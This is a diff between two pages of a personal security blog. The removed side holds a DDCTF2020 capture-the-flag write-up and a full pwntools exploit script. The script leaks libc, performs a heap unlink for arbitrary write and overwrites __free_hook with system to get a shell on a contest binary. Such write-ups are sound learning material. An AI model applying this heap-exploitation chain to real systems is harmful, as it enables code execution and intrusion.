@@ -43,7 +43,7 @@
     
     <title>
         
-            DDCTF2020 pwn | 
+            Tag: heap | 
         
         Apr1L&#39;s blog
     </title>
@@ -54,7 +54,7 @@
 
     <meta name="format-detection" content="telephone=no">
     <meta name="description" itemprop="description" content>
-    <meta name="keywords" content=",pwn">
+    <meta name="keywords" content>
     <meta name="theme-color" content="#0097A7">
 
     <!-- Disable Fucking Bloody Baidu Tranformation -->
@@ -81,9 +81,6 @@
         <style id="style_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("style_css","/css/style.min.css?MKetZV3cUTfDxvMffaOezg==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
 
         
-            
-                <style id="prettify_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("prettify_css","/css/prettify.min.css?zp8STOU9v89XWFEnN+6YmQ==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
-                <style id="prettify_theme"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("prettify_theme","/css/prettify/github-v2.min.css?AfzKxt++K+/lhZBlSjnxwg==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
             
         
 
@@ -220,7 +217,7 @@
     <!-- WebAPP Icons -->
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="application-name" content="Apr1L&#39;s blog">
-    <meta name="msapplication-starturl" content="http://suvii22.github.io/2020/09/21/DDCTF2020-pwn/">
+    <meta name="msapplication-starturl" content="http://suvii22.github.io/tags/heap/">
     <meta name="msapplication-navbutton-color" content="#0097A7">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-title" content="Apr1L&#39;s blog">
@@ -235,16 +232,13 @@
     
 
     <!-- The Open Graph protocol -->
-    <meta property="og:url" content="http://suvii22.github.io/2020/09/21/DDCTF2020-pwn/">
+    <meta property="og:url" content="http://suvii22.github.io/tags/heap/">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="DDCTF2020 pwn | Apr1L&#39;s blog">
+    <meta property="og:title" content="Tag: heap | Apr1L&#39;s blog">
     <meta property="og:image" content="/img/favicon.png">
     <meta property="og:description" content>
-    <meta property="og:article:tag" content="pwn"> 
-
     
-        <meta property="article:published_time" content="Mon Sep 21 2020 13:44:20 GMT+0800">
-        <meta property="article:modified_time" content="Mon Oct 26 2020 12:19:21 GMT+0800">
+
     
 
     <!-- The Twitter Card protocol -->
@@ -252,43 +246,13 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="http://suvii22.github.io/2020/09/21/DDCTF2020-pwn/index.html">
+        <link rel="canonical" href="http://suvii22.github.io/tags/heap/index.html">
     
 
     <!-- Structured-data for SEO -->
     
         
 
-
-<script type="application/ld+json">
-{
-    "@context": "https://schema.org",
-    "@type": "BlogPosting",
-    "mainEntityOfPage": "http://suvii22.github.io/2020/09/21/DDCTF2020-pwn/index.html",
-    "headline": "DDCTF2020 pwn",
-    "datePublished": "Mon Sep 21 2020 13:44:20 GMT+0800",
-    "dateModified": "Mon Oct 26 2020 12:19:21 GMT+0800",
-    "author": {
-        "@type": "Person",
-        "name": "Apr1L",
-        "image": {
-            "@type": "ImageObject",
-            "url": "/img/avatar.png"
-        },
-        "description": "Hi, nice to meet you"
-    },
-    "publisher": {
-        "@type": "Organization",
-        "name": "Apr1L&#39;s blog",
-        "logo": {
-            "@type":"ImageObject",
-            "url": "/img/favicon.png"
-        }
-    },
-    "keywords": ",pwn",
-    "description": "",
-}
-</script>
 
 
     
@@ -322,289 +286,99 @@
                         </button>
                     
 
-                    <!-- Post TOC -->
-
+                    <!-- Index Module -->
+<div class="material-index mdl-grid">
     
-    <!-- Back Button -->
-    <!--
-    <div class="material-back" id="backhome-div" tabindex="0">
-        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
-           href="#" onclick="window.history.back();return false;"
-           target="_self"
-           role="button"
-           data-upgraded=",MaterialButton,MaterialRipple">
-            <i class="material-icons" role="presentation">arrow_back</i>
-            <span class="mdl-button__ripple-container">
-                <span class="mdl-ripple"></span>
-            </span>
-        </a>
-    </div>
-    -->
+    <div class="locate-thumbnail-symbol"></div>
 
-
-    <!-- Left aligned menu below button -->
-    
+    <!-- Pin on top -->
     
 
-
-
-
-<!-- Layouts -->
-
-    <!-- Post Module -->
-    <div class="material-post_container">
-
-        <div class="material-post mdl-grid">
-            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
-
-                <!-- Post Header(Thumbnail & Title) -->
-                
-    <!-- Paradox Post Header -->
+    <!-- Normal Post -->
+    
+        
+            
+                <!-- Paradox Thumbnail -->
+                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
+    <!-- Post Thumbnail -->
     
         
             <!-- Random Thumbnail -->
             <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-            <script type="text/ls-javascript" id="post-thumbnail-script">
-    var randomNum = Math.floor(Math.random() * 19 + 1);
+        
+    
 
-    $('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
+        <!-- Post Title -->
+        <p class="article-headline-p"><a href="/2020/11/01/ByteCTF2020-gun/">ByteCTF2020 gun</a></p>
+    </div>
+
+    <!-- Post Excerpt -->
+    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
+        
+            ByteCTF2020也太难了，gun由于不会setcontext只做了一半，剩下一半被1s秒杀（1s，yyds）。记录一下学到的新姿势。
+...
+        
+        &nbsp;&nbsp;&nbsp;
+        <span>
+            <a href="/2020/11/01/ByteCTF2020-gun/" target="_self">Read more</a>
+        </span>
+    </div>
+    <!-- Post_entry Info-->
+    <div id="post_entry-info">
+        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
+            <!-- Author Avatar -->
+            <div id="author-avatar">
+                <img src="/img/avatar.png" width="44px" height="44px" alt="Apr1L's avatar">
+            </div>
+            <div>
+                <strong>Apr1L</strong>
+                <span>Nov 01, 2020</span>
+            </div>
+        </div>
+        <div id="post_entry-right-info">
+          
+              <!-- Category -->
+              <span class="post_entry-category">
+                  <a class="post_category-link" href="/categories/pwn/">pwn</a>, <a class="post_category-link" href="/categories/pwn/wp/">wp</a>
+              </span>
+            
+
+            
+
+            
+
+            <!-- Post Views -->
+            <span class="post_entry-views">
+            </span>
+        </div>
+    </div>
+</div>
+
+            
+            
+        
+    
+
+    
+
+    
+        <script type="text/ls-javascript" id="thumbnail-script">
+    var randomNum;
+
+    var locatePost = $('.locate-thumbnail-symbol').next();
+    for(var i = 0; i < 10; i++) {
+        randomNum = Math.floor(Math.random() * 19 + 1);
+
+        locatePost.children('.post_thumbnail-random').attr('id', 'random_thumbnail-'+randomNum);
+        locatePost.children('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
     $('.post_thumbnail-random').addClass('lazy');
+
+        locatePost = locatePost.next();
+    }
 </script>
 
-        
-    
-            <p class="article-headline-p">
-                DDCTF2020 pwn
-            </p>
-        </div>
-
-
-
-
-
-                
-                    <!-- Paradox Post Info -->
-                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
-
-    <!-- Author Avatar -->
-    <div id="author-avatar">
-        <img src="/img/avatar.png" width="44px" height="44px" alt="Author Avatar"/>
-    </div>
-    <!-- Author Name & Date -->
-    <div>
-        <strong>Apr1L</strong>
-        <span>Sep 21, 2020</span>
-    </div>
-
-    <div class="section-spacer"></div>
-
-    <!-- Favorite -->
-    <!--
-        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
-            <i class="material-icons" role="presentation">favorite</i>
-            <span class="visuallyhidden">favorites</span>
-        </button>
-    -->
-
-    <!-- Qrcode -->
-    
-
-    <!-- Tags (bookmark) -->
-    
-    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
-        <i class="material-icons" role="presentation">bookmark</i>
-        <span class="visuallyhidden">bookmark</span>
-    </button>
-    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
-        <li class="mdl-menu__item">
-        <a class="post_tag-link" href="/tags/pwn/">pwn</a>
-    </ul>
-    
-
-    <!-- Share -->
-    
-        <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
-    <i class="material-icons" role="presentation">share</i>
-    <span class="visuallyhidden">share</span>
-</button>
-<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
-    
-
-    
-
-    <!-- Share Weibo -->
-    
-        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=DDCTF2020 pwn&url=http://suvii22.github.io/2020/09/21/DDCTF2020-pwn/index.html&pic=http://suvii22.github.io/img/favicon.png&searchPic=false&style=simple" target="_blank">
-            <li class="mdl-menu__item">
-                Share to Weibo
-            </li>
-        </a>
-    
-
-    <!-- Share Twitter -->
-    
-        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=DDCTF2020 pwn&url=http://suvii22.github.io/2020/09/21/DDCTF2020-pwn/index.html&via=Apr1L" target="_blank">
-            <li class="mdl-menu__item">
-                Share to Twitter
-            </li>
-        </a>
-    
-
-    <!-- Share Facebook -->
-    
-        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://suvii22.github.io/2020/09/21/DDCTF2020-pwn/index.html" target="_blank">
-            <li class="mdl-menu__item">
-                Share to Facebook
-            </li>
-        </a>
-    
-
-    <!-- Share Google+ -->
-    
-        <a class="post_share-link" href="https://plus.google.com/share?url=http://suvii22.github.io/2020/09/21/DDCTF2020-pwn/index.html" target="_blank">
-            <li class="mdl-menu__item">
-                Share to Google+
-            </li>
-        </a>
-    
-
-    <!-- Share LinkedIn -->
-    
-
-    <!-- Share QQ -->
-    
-
-    <!-- Share Telegram -->
-    
-</ul>
-
     
 </div>
-
-                
-
-                <!-- Post Content -->
-                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
-    
-        <p>这个程序的洞在 show 的时候会 push 一个 0xaabbccdd，当申请新的 chunk 时并没有更新 start 指针，这样就有可能造成 edit 向下溢出。</p>
-<p>利用方法全程参考这篇<a href="http://yulige.top/?p=780" target="_blank" rel="noopener">writeup</a>。将一个0x90的chunk通过show释放进入unsortedbin，因为未更新start指针，可以leak出libc；因为程序没开pie，可以通过show来实现unlink（向后合并堆块，太菜了学到了），修改bss地址来造成任意地址写，之后覆写free_hook为system来get shell。</p>
-<p>exp:</p>
-<pre><code class="python">from pwn import *
-
-context.log_level = &#39;debug&#39;
-
-p = process(&#39;./pwn1&#39;)
-libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
-
-def add(num):
-    p.sendlineafter(&#39;&gt;&gt;&#39;,str(1))
-    p.sendlineafter(&#39;num:&#39;,str(num))
-
-def clear():
-    p.sendlineafter(&#39;&gt;&gt;&#39;,str(3))
-
-def show():
-    p.sendlineafter(&#39;&gt;&gt;&#39;,str(2))
-
-def edit(con):
-    p.sendlineafter(&#39;(y/n):&#39;,&#39;y&#39;)
-    p.sendline(str(con))
-
-
-for i in range(16):
-    add(i)
-show()
-p.recvuntil(&#39;1:&#39;)
-libc_base = int(p.recvline())-0x3c4b78
-p.info(&#39;libc_base: &#39;+hex(libc_base))
-
-system = libc_base + libc.sym[&#39;system&#39;]
-bin_sh = libc_base + next(libc.search(&#39;/bin/sh\x00&#39;))
-free_hook = libc_base + libc.sym[&#39;__free_hook&#39;]
-
-for i in range(34):
-    p.sendlineafter(&#39;(y/n):&#39;,&#39;n&#39;)
-clear()
-
-for i in range(8):
-    add(0x20)
-show()
-
-for i in range(8):
-    p.sendlineafter(&#39;Edit (y/n):&#39;,&#39;n&#39;)
-edit(&#39;-16&#39;)
-edit(0x90)
-edit(0)
-edit(0x21)
-edit(0x605398 - 0x18)
-edit(0x605398 - 0x10)
-for i in range(4):
-    p.sendlineafter(&#39;Edit (y/n):&#39;,&#39;n&#39;)
-
-#gdb.attach(p)
-#pause()
-for i in range(7):
-    add(i)
-show()
-edit(free_hook - 8)
-edit(free_hook + 8)
-edit(0)
-edit(0x605398)
-edit(0x6053A8)
-show()
-edit(0x68732F6E69622F)
-edit(system)
-clear()
-
-#gdb.attach(p)
-p.interactive()</code></pre>
-
-        
-    
-
-    
-</div>
-
-
-                
-
-                <!-- Post Comments -->
-                
-                    
-                
-            </div>
-
-            <!-- Post Prev & Next Nav -->
-            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
-    <!-- Prev Nav -->
-    
-        <a href="/2020/10/23/N1CTF2020-SignIn/" id="post_nav-newer" class="prev-content">
-            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
-                <i class="material-icons">arrow_back</i>
-            </button>
-            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-            Newer
-        </a>
-    
-
-    <!-- Section Spacer -->
-    <div class="section-spacer"></div>
-
-    <!-- Next Nav -->
-    
-        <a href="/2020/09/01/dycb-veryeasy/" id="post_nav-older" class="next-content">
-            Older
-            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
-                <i class="material-icons">arrow_forward</i>
-            </button>
-        </a>
-    
-</nav>
-
-        </div>
-    </div>
-
 
 
                     
@@ -777,14 +551,6 @@ It will not impact the appearance and can give developers a lot of support :)
                     
 
                     
-                        <!-- Footer Top Button -->
-                        <div id="back-to-top" class="toTop-wrap">
-    <a href="#top" class="toTop">
-        <i class="material-icons footer_top-i">expand_less</i>
-    </a>
-</div>
-
-                    
 
                     <!--Footer-->
 <footer class="mdl-mini-footer" id="bottom">
@@ -913,10 +679,6 @@ It will not impact the appearance and can give developers a lot of support :)
 <!-- Import prettify js  -->
 
     
-        
-            <script>lsloader.load("prettify_js","/js/prettify.min.js?WN07fivHQSMKWy7BmHBB6w==", true)</script>
-        
-    
 
 
 
@@ -929,11 +691,6 @@ It will not impact the appearance and can give developers a lot of support :)
     });
 
     
-        
-            $(function() {
-                $('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
-                prettyPrint();
-                })
         
     
     
